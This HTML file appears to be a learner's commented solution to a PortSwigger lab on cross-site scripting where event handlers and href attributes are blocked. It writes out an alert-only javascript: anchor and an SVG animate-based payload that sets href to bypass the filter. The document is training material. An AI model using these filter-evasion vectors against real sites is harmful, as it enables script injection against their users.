<!-- 
    link to the lab: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked
    2 way to run javascript in html: 
        +) from event
            ex: <button onclick="location.href='URl'"
        +) from anchor tag 
            ex: <a href="javascript:location.href='URl'">URL</a>"
    But the first way was blocked by the server
    And after running the script check_tags_events, we found out that there are some tags allowed by server 
    Which are: <a>, <image>, <animate>, <title> and <svg>
-->

<!-- to trigger an alert with anchor tag html, we do: -->
<a href="javascript:alert('XSS vuln')"> Click me </a> <br><br><br> 

<!-- 
    so to solve the lab, we need to know that tag <svg> allow us to use other html tags
    we try to put an anchor tag inside the <svg> tag: <svg> <a href="javascript:alert(123)"></a> </svg>
    but as we have already known that href attributes was blocked, so we need to try anotherway
    we gonna use <animate> tag to assign attribute and it's value to the element that contains this tag
    and in order to include simulated lab user to click our vector, we need to add the word "Click" to the <svg> tag
    but we cannot use plain text in the <svg> tag, so we try <text> in search bar and find out that <text> tag is usable
-->

<svg>
    
    <a>
        
        <animate attributename="href" values="javascript:alert('XSS vuln')"></animate>        
        <text x="20" y="20">Click</text>

    </a>
    
</svg>

<!-- this is an example of how to use the svg tag and passively use an attribute: https://developer.mozilla.org/en-US/docs/Web/SVG/Element/animate -->
